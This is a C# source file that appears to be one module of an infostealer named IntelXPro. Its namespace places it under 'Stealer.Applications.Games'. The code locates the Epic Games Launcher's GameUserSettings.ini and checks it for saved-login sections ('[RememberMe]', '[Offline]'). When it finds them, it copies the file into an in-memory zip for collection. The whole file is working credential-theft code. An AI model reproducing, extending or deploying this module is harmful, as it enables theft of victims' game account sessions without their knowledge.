using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Games
{
    internal class Epic : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "EpicGamesLauncher", "Saved", "Config", "Windows", "GameUserSettings.ini");
            if (File.Exists(text))
            {
                string text2 = File.ReadAllText(text);
                if (text2.Contains("[RememberMe]") || text2.Contains("[Offline]"))
                {
                    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
                    counterApplications.Name = "Epic Games";
                    string text3 = "Epic\\GameUserSettings.ini";
                    zip.AddFile(text3, Encoding.UTF8.GetBytes(text2));
                    counterApplications.Files.Add(text + " => " + text3);
                    counter.Games.Add(counterApplications);
                }
            }
        }
    }

}
